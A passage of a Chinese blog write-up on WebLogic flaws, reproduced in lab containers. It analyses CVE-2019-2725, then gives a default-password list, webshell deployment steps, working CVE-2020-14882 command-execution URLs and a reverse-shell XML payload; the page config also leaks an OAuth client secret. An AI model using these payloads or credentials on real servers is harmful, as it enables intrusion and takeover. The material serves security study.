class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230823131024.png"><br><strong>漏洞分析</strong>：<br>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">readUTF:<span class="number">111</span>, WorkContextXmlInputAdapter (weblogic.wsee.workarea)</span><br><span class="line">readEntry:<span class="number">92</span>, WorkContextEntryImpl (weblogic.workarea.spi)</span><br><span class="line">receiveRequest:<span class="number">179</span>, WorkContextLocalMap (weblogic.workarea)</span><br><span class="line">receiveRequest:<span class="number">163</span>, WorkContextMapImpl (weblogic.workarea)</span><br><span class="line">handleRequest:<span class="number">27</span>, WorkAreaServerHandler (weblogic.wsee.workarea)</span><br><span class="line">handleRequest:<span class="number">141</span>, HandlerIterator (weblogic.wsee.handler)</span><br><span class="line">dispatch:<span class="number">114</span>, ServerDispatcher (weblogic.wsee.ws.dispatch.server)</span><br><span class="line">invoke:<span class="number">80</span>, WsSkel (weblogic.wsee.ws)</span><br><span class="line">handlePost:<span class="number">66</span>, SoapProcessor (weblogic.wsee.server.servlet)</span><br><span class="line">process:<span class="number">44</span>, SoapProcessor (weblogic.wsee.server.servlet)</span><br><span class="line">run:<span class="number">285</span>, BaseWSServlet$AuthorizedInvoke (weblogic.wsee.server.servlet)</span><br><span class="line">service:<span class="number">169</span>, BaseWSServlet (weblogic.wsee.server.servlet)</span><br><span class="line">service:<span class="number">820</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">run:<span class="number">227</span>, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal)</span><br><span class="line">invokeServlet:<span class="number">125</span>, StubSecurityHelper (weblogic.servlet.internal)</span><br><span class="line">execute:<span class="number">301</span>, ServletStubImpl (weblogic.servlet.internal)</span><br><span class="line">execute:<span class="number">184</span>, ServletStubImpl (weblogic.servlet.internal)</span><br><span class="line">wrapRun:<span class="number">3732</span>, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)</span><br><span class="line">run:<span class="number">3696</span>, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)</span><br><span class="line">doAs:<span class="number">321</span>, AuthenticatedSubject (weblogic.security.acl.internal)</span><br><span class="line">runAs:<span class="number">120</span>, SecurityManager (weblogic.security.service)</span><br><span class="line">securedExecute:<span class="number">2273</span>, WebAppServletContext (weblogic.servlet.internal)</span><br><span class="line">execute:<span class="number">2179</span>, WebAppServletContext (weblogic.servlet.internal)</span><br><span class="line">run:<span class="number">1490</span>, ServletRequestImpl (weblogic.servlet.internal)</span><br><span class="line">execute:<span class="number">256</span>, ExecuteThread (weblogic.work)</span><br><span class="line">run:<span class="number">221</span>, ExecuteThread (weblogic.work)</span><br></pre></td></tr></table></figure>

<p>在weblogic&#x2F;wsee&#x2F;server&#x2F;servlet&#x2F;SoapProcessor中的process方法对soap消息进行了处理，post提交，调用其本类的handlePost方法进行处理</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handlePost</span><span class="params">(BaseWSServlet var1, HttpServletRequest var2, HttpServletResponse var3)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">assert</span> var1.getPort() != <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 获取WsPort对象</span></span><br><span class="line">    <span class="type">WsPort</span> <span class="variable">var4</span> <span class="operator">=</span> var1.getPort();</span><br><span class="line">    <span class="comment">// 获取绑定类型</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">var5</span> <span class="operator">=</span> var4.getWsdlPort().getBinding().getBindingType();</span><br><span class="line">    <span class="comment">// 创建HttpServerTransport实例，用于处理HTTP请求和响应</span></span><br><span class="line">    <span class="type">HttpServerTransport</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpServerTransport</span>(var2, var3);</span><br><span class="line">    <span class="comment">// 获取WsSkel对象</span></span><br><span class="line">    <span class="type">WsSkel</span> <span class="variable">var7</span> <span class="operator">=</span> (WsSkel)var4.getEndpoint();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 使用Connection工厂创建服务器连接</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">var8</span> <span class="operator">=</span> ConnectionFactory.instance().createServerConnection(var6, var5);</span><br><span class="line">        var7.invoke(var8, var4);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ConnectionException var9) &#123;</span><br><span class="line">        <span class="comment">// 调用WsSkel的invoke方法，处理连接和WsPort对象</span></span><br><span class="line">        <span class="built_in">this</span>.sendError(var3, var9, <span class="string">&quot;Failed to create connection&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable var10) &#123;</span><br><span class="line">        <span class="built_in">this</span>.sendError(var3, var10, <span class="string">&quot;Unknown error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>中间的其他过程不管，来到weblogic&#x2F;wsee&#x2F;workarea&#x2F;WorkAreaServerHandler中的handleRequest方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">handleRequest</span><span class="params">(MessageContext var1)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">WlMessageContext</span> <span class="variable">var2</span> <span class="operator">=</span> WlMessageContext.narrow(var1);</span><br><span class="line">        <span class="comment">// 获取消息头部</span></span><br><span class="line">        <span class="type">MsgHeaders</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getHeaders();</span><br><span class="line">        <span class="comment">// 从消息头部获取WorkAreaHeader</span></span><br><span class="line">        <span class="type">WorkAreaHeader</span> <span class="variable">var4</span> <span class="operator">=</span> (WorkAreaHeader)var3.getHeader(WorkAreaHeader.TYPE);</span><br><span class="line">        <span class="keyword">if</span> (var4 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 获取WorkContextMapInterceptor实例</span></span><br><span class="line">            <span class="type">WorkContextMapInterceptor</span> <span class="variable">var5</span> <span class="operator">=</span> WorkContextHelper.getWorkContextHelper().getInterceptor();</span><br><span class="line">            <span class="comment">// 使用WorkContextXmlInputAdapter适配器接收请求</span></span><br><span class="line">            var5.receiveRequest(<span class="keyword">new</span> <span class="title class_">WorkContextXmlInputAdapter</span>(var4.getInputStream()));</span><br><span class="line">            <span class="keyword">if</span> (verbose) &#123;</span><br><span class="line">                Verbose.log(<span class="string">&quot;Received WorkAreaHeader &quot;</span> + var4);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JAXRPCException</span>(<span class="string">&quot;Unable to procees WorkContext:&quot;</span> + var6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前面也提到，WorkContextXmlInputAdapter的构造函数中new了一个XMLDecoder对象，传入的是soap header的wordcontext元素<br>接下来的步骤和CVE-2017-10271一致，其实它们的漏洞原理都是一致的<br><strong>补丁分析</strong>：<br>使用网上一张图<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20190501174422-b2e76a36-6bf5-1.png"><br>这里直接ban掉了class元素以及限制了array元素的长度</p>
<p><strong>参考</strong>：<br><a target="_blank" rel="noopener" href="https://co0ontty.github.io/2019/08/08/CVE_2019_2725.html">Weblogic 反序列化远程代码执行漏洞（CVE-2019-2725) - co0ontty</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5024">Weblogic 远程命令执行漏洞分析(CVE-2019-2725)及利用payload构造详细解读</a></p>
<h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8465">WebLogic-XMLDecoder反序列化漏洞分析</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1848">Weblogic XMLDecoder RCE分析</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5046">xmldecoder反序列化的补丁与绕过</a></p>
<h1 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h1><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p><strong>前置知识</strong>：<br>后台常用默认弱口令：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">system/password</span><br><span class="line">weblogic/weblogic</span><br><span class="line">admin/security</span><br><span class="line">joe/password</span><br><span class="line">mary/password</span><br><span class="line">system/security</span><br><span class="line">wlcsystem/wlcsystem</span><br><span class="line">wlpisystem/wlpisystem</span><br><span class="line">weblogic/Oracle@123</span><br></pre></td></tr></table></figure>

<p>weblogic常用弱口令： <a target="_blank" rel="noopener" href="http://cirt.net/passwords?criteria=weblogic">http://cirt.net/passwords?criteria=weblogic</a><br>后台登录地址：&#x2F;console&#x2F;login&#x2F;LoginForm.jsp<br>另外weblogic的密码使用AES加密（老版本使用3DES），对称密码在获取密文和密钥的情况下可解密，存放的文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml<br><strong>环境</strong>：<br>使用vulhub中的docker环境进行复现：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">╭─dili@dili ~/vulhub/weblogic/weak_password ‹master› </span><br><span class="line">╰─$ sudo docker-compose up -d </span><br><span class="line"></span><br><span class="line">╭─dili@dili ~/vulhub/weblogic/weak_password ‹master› </span><br><span class="line">╰─$ sudo docker ps           </span><br><span class="line">CONTAINER ID   IMAGE                               COMMAND                  CREATED          STATUS          PORTS                                                                                  NAMES</span><br><span class="line">76e193e908ce   vulhub/weblogic:10.3.6.0-2017       <span class="string">&quot;startWebLogic.sh&quot;</span>       44 seconds ago   Up 23 seconds   0.0.0.0:5556-&gt;5556/tcp, :::5556-&gt;5556/tcp, 0.0.0.0:7001-&gt;7001/tcp, :::7001-&gt;7001/tcp   weak_password_weblogic_1</span><br></pre></td></tr></table></figure>

<p>docker环境在服务器中，将7001映射到外部端口33401<br>访问<code>http://10.140.32.159:33401/console/login/LoginForm.jsp</code><br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230729232120.png"><br>使用常用的弱口令尝试登录，用户名：weblogic   口令：Oracle@123<br>成功登入后台，接下来就是找到上传文件的点，获取shell<br>点击部署-&gt;安装<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230729235850.png"><br>准备一个jsp马，并将对应的目录打成war包上传</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf pack.war .</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230730105646.png"><br>部署成功，使用冰蝎进行连接<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230730110023.png"><br>参考：<a target="_blank" rel="noopener" href="http://www.meta-sec.top/2022/02/09/weblogic-chang-jian-lou-dong-yi-kong-zhi-tai-ruo-kou-ling/">weblogic常见漏洞（一）- 控制台弱口令 | meta-sec</a></p>
<h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><h3 id="CVE-2018-2894"><a href="#CVE-2018-2894" class="headerlink" title="CVE-2018-2894"></a>CVE-2018-2894</h3><p><strong>漏洞复现</strong>：<br>使用vulhub上的docker搭建环境</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>查看此容器的账户和密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose logs | grep password</span><br></pre></td></tr></table></figure>

<p>使用账户(weblogic)和密码(deUHw2wQ)登录后台<br>选择高级选项<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230824204149.png"><br>启用Web服务测试页<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230824204341.png"><br>开发环境下的测试页有config.do和begin.do<br>进入config.do文件，将目录设置为ws_utc应用的静态文件css目录</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230824205951.png"><br>上传一个jsp文件<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230824210608.png"><br>后端存储的文件名是时间戳+上传的文件名，时间戳会回显在代码中<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230824210930.png"><br>访问<code>http://10.140.32.159:33401/ws_utc/css/config/keystore/1692882428438_shell.jsp</code><br>使用冰蝎连接<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230824211202.png"><br>同样可以使用begin.do进行利用<br>访问<code>http://10.140.32.159:33401/ws_utc/begin.do</code>，上传jsp<br>尽管上传后会报错，但是抓post包的响应中有jsp文件名<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230824211711.png"><br>访问<code>http://10.140.32.159:33401/ws_utc/css/upload/RS_Upload_2023-08-24_13-16-31_154/import_file_name_shell.jsp</code>，使用冰蝎连接</p>
<h3 id="CVE-2020-14882"><a href="#CVE-2020-14882" class="headerlink" title="CVE-2020-14882"></a>CVE-2020-14882</h3><p><strong>漏洞复现</strong>：<br>使用vulhub上的docker搭建环境<br>这里未授权访问的地址是<br><code>http://10.140.32.159:33401/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=AppDeploymentsControlPage&amp;handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29</code>，通过这个地址就能够进入后台<br>命令执行操作：<br><code>http://10.140.32.159:33401/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch /tmp/CVE-2020-14882%27);%22);</code><br>命令执行成功<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230825143226.png"><br>反弹shell<br>创建一个xml文件</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># reverse-bash.xml</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/172.24.0.1/5555 0&gt;&amp;1]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问下面url即可进行shell反弹<br><code>http://10.140.32.159:33401/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext(&quot;http://172.24.0.1:8080/cve-2020-14882-reverse-bash.xml&quot;)</code></p>
<p>参考：<a target="_blank" rel="noopener" href="https://cert.360.cn/report/detail?id=a95c049c576af8d0e56ae14fad6813f4">CVE-2020-14882：Weblogic Console 权限绕过深入解析 - 360CERT</a></p>
<h1 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9932">weblogic漏洞大杂烩</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14201884.html">Java安全之初探weblogic T3协议漏洞 - nice_0e3 - 博客园 (cnblogs.com)</a><br><a target="_blank" rel="noopener" href="https://y4er.com/series/weblogic/">Weblogic - 系列 - Y4er的博客</a><br><a target="_blank" rel="noopener" href="http://drops.xmd5.com/static/drops/web-13470.html">修复weblogic的JAVA反序列化漏洞的多种方法 | WooYun知识库 (xmd5.com)</a><br><a target="_blank" rel="noopener" href="https://paper.seebug.org/1321/">Weblogic12c T3 协议安全漫谈 (seebug.org)</a></p>
<blockquote>
<p>注：本文首发于<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12947&https://xz.aliyun.com/t/12964">https://xz.aliyun.com/t/12947&amp;https://xz.aliyun.com/t/12964</a></p>
</blockquote>

    </div>

    
    
    

    <footer class="post-footer"><div>
  <div class="end-slogan" style="text-align:center;font-size:22px;letter-spacing:10px;user-seclect:none;color:#bbb">----------- 本文结束啦<i class="fa fa-star"></i>感谢您阅读-----------</div>		
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>DiliLearngent
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://dililearngent.github.io/2023/05/02/Weblogic-Security/" title="Java安全之Weblogic漏洞分析与利用">https://dililearngent.github.io/2023/05/02/Weblogic-Security/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/Java/" rel="tag"># Java</a>
              <a href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag"># Java安全</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2023/04/30/Rome/" rel="prev" title="Java安全之Rome分析与利用">
                  <i class="fa fa-chevron-left"></i> Java安全之Rome分析与利用
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2023/05/02/Shiro-security/" rel="next" title="Java安全之Shiro反序列化漏洞分析">
                  Java安全之Shiro反序列化漏洞分析 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments gitalk-container"></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2019 – 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">DiliLearngent</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">101k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">6:08</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div><!-- 网站运行时间的设置 -->
<span id="timeDate">载入天数...</span>
<span id="times">载入时分秒...</span>
<script>
    var now = new Date();
    function createtime() {
        var grt= new Date("05/20/2020 13:14:00");//此处修改你的建站时间或者网站上线时间
        now.setTime(now.getTime()+250);
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
    }
setInterval("createtime()",250);
</script>


    </div>
  </footer>

  

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js" integrity="sha256-2Pmvv0kuTBOenSvLm6bvfBSSHrUJ+3A7x6P5Ebd07/g=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/fancybox.js"></script>

  <script src="/js/third-party/pace.js"></script>


  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">

<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"DiliLearngent","repo":"dililearngent.github.io","client_id":"e12e8d95c8711de863a8","client_secret":"22368c9ebad498682ec51031519e47b96c45ee7c","admin_user":"DiliLearngent","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"bade2f9899cf279e6cd90ebf591bd462"}</script>
<script src="/js/third-party/comments/gitalk.js"></script>
<div class="moon-menu">
  <div class="moon-menu-items">
    
    <div id="moon-menu-item-back2bottom" class="moon-menu-item">
      <i class='fas fa-chevron-down'></i>    </div>
    
    <div id="moon-menu-item-back2top" class="moon-menu-item">
      <i class='fas fa-chevron-up'></i>    </div>
    
  </div>
  <div class="moon-menu-button">
    <svg class="moon-menu-bg">
      <circle class="moon-menu-cricle" cx="50%" cy="50%" r="44%"></circle>
      <circle class="moon-menu-border" cx="50%" cy="50%" r="48%"></circle>
    </svg>
    <div class="moon-menu-content">
      <div class="moon-menu-icon"><i class='fas fa-ellipsis-v'></i></div>
      <div class="moon-menu-text"></div>
    </div>
  </div>
</div><script src="/js/injector.js"></script>
</body>
</html>
